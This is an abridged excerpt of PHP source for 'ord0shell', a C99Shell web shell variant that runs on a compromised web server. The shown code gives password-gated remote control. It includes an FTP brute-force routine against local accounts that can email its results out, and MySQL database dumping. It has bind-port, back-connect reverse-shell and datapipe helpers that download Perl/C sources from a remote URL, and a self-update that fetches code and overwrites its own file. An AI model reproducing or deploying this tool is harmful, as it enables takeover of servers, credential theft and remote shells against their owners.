...
if (!empty($unset_surl))
{
    setcookie("ord0sh_surl");
    $surl = "";
}
elseif (!empty($set_surl))
{
    $surl = $set_surl;
    setcookie("ord0sh_surl", $surl);
}
else
{
    $surl = $_REQUEST["ord0sh_surl"];
}
$surl_autofill_include = true;
if ($surl_autofill_include and !$_REQUEST["ord0sh_surl"])
{
    $include = "&";
...
$accessdeniedmess = "<a href=\"\">ord0shell v." . $shver . "</a>: access denied";
$gzipencode = true;
$updatenow = false;
$ord0sh_updateurl = "";
$ord0sh_sourcesurl = "";
$filestealth = true;
$donated_html = "<center><b>test</b></center>";
$donated_act = array(
    ""
);
$curdir = "./";
...
{
    exit("<a href=\"https://github.com/ord0/C99Shell-PHP7\">ord0shell</a>: Access Denied - your host (" . getenv("REMOTE_ADDR") . ") not allow");
}
if (!empty($login))
{
    if (empty($md5_pass))
    ...
    if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
    {
        ...
        header("WWW-Authenticate: Basic realm=\"ord0shell " . $shver . ": " . $login_txt . "\"");
...
if ($act != "img")
{
    ...
    if (!function_exists("ord0_buff_prepare"))
    {
        function ord0_buff_prepare()
        {
            global $sess_data;
            global $act;
    ...
    ord0_buff_prepare();
    if (!function_exists("ord0_sess_put"))
    {
        function ord0_sess_put($data)
        {
            global $sess_cookie;
            global $sess_data;
            ord0_buff_prepare();
    ...
    if (!function_exists("ord0getsource"))
    {
        function ord0getsource($fn)
        {
            global $ord0sh_sourcesurl;
            $array = array(
                "ord0sh_bindport.pl" => "ord0sh_bindport_pl.txt",
                "ord0sh_bindport.c" => "ord0sh_bindport_c.txt",
                "ord0sh_backconn.pl" => "ord0sh_backconn_pl.txt",
                "ord0sh_backconn.c" => "ord0sh_backconn_c.txt",
                "ord0sh_datapipe.pl" => "ord0sh_datapipe_pl.txt",
                "ord0sh_datapipe.c" => "ord0sh_datapipe_c.txt",
            );
            $name = $array[$fn];
            if ($name)
            {
                return file_get_contents($ord0sh_sourcesurl . $name);
            }
            else
            {
                return false;
    ...
    if (!function_exists("ord0sh_getupdate"))
    {
        function ord0sh_getupdate($update = true)
        {
            $url = $GLOBALS["ord0sh_updateurl"] . "?version=" . urlencode(base64_encode($GLOBALS["shver"])) . "&updatenow=" . ($updatenow ? "1" : "0") . "&";
                ...
                if ($data{0} == "\x99" and $data{1} == "\x03")
                {
                    ...
                    if ($update)
                    {
                        ...
                        else
                        {
                            ...
                            if (!$fp)
                            {
                                return "Local error: can't write update to " . __FILE__ . "! You may download ord0shell.php manually <a href=\"" . $sourceurl . "\"><u>here</u></a>.";
                            }
                            else
                            {
                                fwrite($fp, $source);
    ...
    if (!function_exists("mysql_dump"))
    {
        function mysql_dump($set)
        {
            ...
            $out = "# Dumped by C99Shell.SQL v. " . $shver . "
					# Home page: https://github.com/ord0/C99Shell-PHP7
					#
					# Host settings:
...
";
    ...
    if (!function_exists("mysql_query_form"))
    {
        function mysql_query_form()
        {
            ...
            {
                echo "<table border=0><tr><td><form name=\"ord0sh_sqlquery\" method=POST><b>";
                ...
                if ($tbl_struct)
                {
                    ...
                    {
                        $name = $field["Field"];
                        echo "» <a href=\"#\" onclick=\"document.ord0sh_sqlquery.sql_query.value+='`" . $name . "`';\"><b>" . $name . "</b></a><br>";
                    }
                    echo "</td></tr></table>";
                }
            }
    ...
    if (!function_exists("ord0fsearch"))
    {
        function ord0fsearch($d)
        {
            global $found;
            global $found_d;
            global $found_f;
    ...
    if ($act == "ftpquickbrute")
    {
        ...
        {
            function ord0ftpbrutecheck($host, $port, $timeout, $login, $pass, $sh, $fqb_onlywithsh)
            {
                if ($fqb_onlywithsh)
                {
            ...
            if (!empty($submit))
            {
                ...
                else
                {
                    if ($fqb_logging)
                    {
                        ...
                        $fqb_log = "FTP Quick Brute (called ord0shell v. " . $shver . ") started at " . date("d.m.Y H:i:s") . "\r\n\r\n";
                        if ($fqb_logfile)
                        {
                    ...
                    while (!feof($fp))
                    {
                        ...
                        if (ord0ftpbrutecheck("localhost", 21, 1, $str[0], $str[0], $str[6], $fqb_onlywithsh))
                        {
                    ...
                    if ($fqb_logemail)
                    {
                        @mail($fqb_logemail, "ord0shell v. " . $shver . " report", $fqb_log);
                    }
                    fclose($fqb_logfp);
                }
            }
            ...
            {
                $logfile = $tmpdir_logs . "ord0sh_ftpquickbrute_" . date("d.m.Y_H_i_s") . ".log";
 ...
 <br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"" . base64_encode($encoder_input) . "\" readonly></center>";
    ...
    if ($act == "selfremove")
    {
        if (($submit == $rndcode) and ($submit != ""))
        {
            ...
            {
                @ob_clean();
                echo "Thanks for using ord0shell v." . $shver . "!";
                ord0shexit();
            }
            else
            {
    ...
    if ($act == "update")
    {
        $ret = ord0sh_getupdate(!!$confirmupdate);
        echo "<b>" . $ret . "</b>";
    ...
    if ($act == "feedback")
    {
        ...
        if (!empty($submit))
        {
            ...
            $body = "ord0shell v." . $shver . " feedback #" . $ticket . "\nName: " . htmlspecialchars($fdbk_name) . "\nE-mail: " . htmlspecialchars($fdbk_email) . "\nMessage:\n" . htmlspecialchars($fdbk_body) . "\n\nIP: " . $REMOTE_ADDR;
            if (!empty($fdbk_ref))
            {
                $tmp = @ob_get_contents();
                ob_clean();
            ...
            mail($suppmail, "ord0shell v." . $shver . " feedback #" . $ticket, $body, "FROM: " . $suppmail);
...
<input type=submit name=submit value=\"Upload\">
  ...
  <b><img src=\"" . $surl . "act=img&img=arrow_ltr\" border=\"0\">";
    ...
    {
        $bndportsrcs = array(
            "ord0sh_bindport.pl" => array(
                "Using PERL",
                "perl %path %port"
            ) ,
            "ord0sh_bindport.c" => array(
                "Using C",
                "%path %port %pass"
            )
        );
        $bcsrcs = array(
            "ord0sh_backconn.pl" => array(
                "Using PERL",
                "perl %path %host %port"
            ) ,
            "ord0sh_backconn.c" => array(
                "Using C",
                "%path %host %port"
            )
        );
        $dpsrcs = array(
            "ord0sh_datapipe.pl" => array(
                "Using PERL",
                "perl %path %localport %remotehost %remoteport"
            ) ,
            "ord0sh_datapipe.c" => array(
                "Using C",
        ...
        if (!empty($bindsubmit))
        {
            ...
            else
            {
                ...
                elseif (!$data = ord0getsource($bind["src"]))
                {
        ...
        if (!empty($bcsubmit))
        {
            ...
            else
            {
                ...
                elseif (!$data = ord0getsource($bc["src"]))
                {
                    echo "Can't download sources!";
                }
                else
        ...
        if (!empty($dpsubmit))
        {
            ...
            else
            {
                ...
                elseif (!$data = ord0getsource($datapipe["src"]))
                {
                    echo "Can't download sources!";
                }
                else
            ...
            elseif ($ft == "code")
            {
                if (preg_match("php" . "BB 2.(.*) auto-generated config file", $r))
                {
                    ...
                    if (count($arr == 18))
                    {
                        ...
                        {
                            echo "But, you can't connect to forum sql-base, because db-software=\"" . $dbms . "\" is not supported by ord0shell. Please, report us for fix.";
                        }
...
if ($act == "about")
{
    echo "<center><b>Credits:<br><br>Kudos to the &quot;Original Creators&quot; of C99Shell.<br><br>and <u>ord0</u> for Latest safe-build and update for PHP 7.<br><br>Thanks to all who reported the bugs.<br>If there are more bugs, please create an issue in https://github.com/ord0/C99Shell-PHP7 </b>";
} ?>
...
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ ord0shell v. <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>maintained by</b></u></a> ord0 | <a href="https://github.com/ord0/C99Shell-PHP7"><font color="#FF0000">C99Shell Github</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime() - starttime, 4); ?> ]--</b></p></td></tr></table>
